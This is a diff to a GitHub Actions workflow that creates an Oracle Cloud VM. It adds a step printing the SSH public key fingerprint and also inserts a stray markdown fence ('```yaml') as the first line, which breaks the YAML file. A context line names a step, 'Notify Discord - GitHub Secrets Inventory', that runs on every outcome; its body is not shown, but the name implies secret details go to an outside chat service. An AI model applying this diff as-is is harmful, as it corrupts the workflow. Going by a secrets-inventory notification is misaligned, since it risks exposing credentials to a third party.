@@ -1,4 +1,4 @@
-
+```yaml
 name: Try to Create OCI VM
 
 on:
@@ -122,6 +122,16 @@ jobs:
           } >> "$GITHUB_ENV"
 
           echo "Validation completed successfully"
+
+      # NEW STEP ADDED HERE
+      - name: Check SSH Public Key Fingerprint
+        run: |
+          set -euo pipefail
+
+          printf '%s\n' "$SSH_PUBLIC_KEY" > /tmp/ssh.pub
+
+          echo "SSH Public Key Fingerprint:"
+          ssh-keygen -lf /tmp/ssh.pub
 
       - name: Check Existing VM
         id: existing_vm
@@ -257,7 +267,7 @@ jobs:
             Instance State: ${{ steps.create_vm.outputs.instance_state || steps.existing_vm.outputs.instance_state || 'Not available' }}
 
             Workflow: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
-         
+
          # ADD THIS NEW STEP BELOW
       - name: Notify Discord - GitHub Secrets Inventory
         if: always()
